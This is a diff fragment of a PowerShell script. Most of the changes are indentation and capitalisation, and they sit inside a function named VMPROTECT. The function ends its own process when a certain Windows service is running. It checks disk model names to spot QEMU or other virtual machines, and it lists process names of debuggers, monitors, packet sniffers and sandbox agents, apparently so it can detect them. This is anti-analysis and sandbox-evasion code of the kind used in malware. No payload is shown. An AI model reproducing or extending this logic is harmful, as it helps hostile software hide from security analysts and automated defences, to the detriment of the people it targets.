@@ -66,10 +66,10 @@ function ram_check {
 }
 
 function VMPROTECT {
-	if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
+   if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
         Stop-Process $pid -Force
     } 	
-	ram_check 
+    ram_check 
     #triage detection
     $d = wmic diskdrive get model
     if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {  
@@ -77,13 +77,13 @@ function VMPROTECT {
     }	
     $processnames = @(
         "autoruns",
-		"Autoruns64",
+	"autoruns64",
         "autorunsc",
-		"autorunsc64",
+	"autorunsc64",
         "die",
         "dumpcap",
-		"etwdump",
-		"efsdump",
+	"etwdump",
+	"efsdump",
         "fakenet",
         "fiddler",
         "filemon",
@@ -98,19 +98,19 @@ function VMPROTECT {
         "lordpe",
         "ollydbg",
         "petools",
-		"portmon",
+	"portmon",
         "proc_analyzer",
         "processhacker",
         "procexp",
-		"procexp64",
+	"procexp64",
         "procmon",
         "procmon64",
-		"pyw",
+	"pyw",
         "qemu-ga",
         "qga",
         "regmon",
         "resourcehacker",
-		"sbiesvc",
+	"sbiesvc",
         "sandman",
         "scylla_x64",
         "sniff_hit",
@@ -120,7 +120,7 @@ function VMPROTECT {
         "tcpdump",
         "tcpview",
         "tcpview64",
-		"udpdump",
+	"udpdump",
         "vboxcontrol",
         "vboxservice",
         "vboxtray",
